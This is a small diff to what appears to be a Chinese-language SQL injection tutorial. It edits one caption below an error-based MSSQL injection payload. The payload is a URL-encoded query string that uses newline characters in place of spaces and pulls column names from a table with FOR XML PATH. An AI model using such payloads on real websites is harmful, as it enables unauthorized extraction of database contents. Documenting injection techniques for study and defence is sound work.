@@ -157,7 +157,7 @@ SELECT column_name+',' FROM(SELECT column_name from dbo.table_name)a FOR  XML PA
 ```html
 xxx.com?abc=a%27%0aand%0a1=(SELECT%0atop%0a5%0acolumn_name%2b%27,%27%0aFROM(SELECT%0acolumn_name%0afrom%0adbo.table_name)a%0aFOR%0a%0aXML%0aPATH(%27%27))%0aand%0a%271%27=%271
 ```
-成功注出字段值
+成功注出前五条数据<br>
 
 
 ---
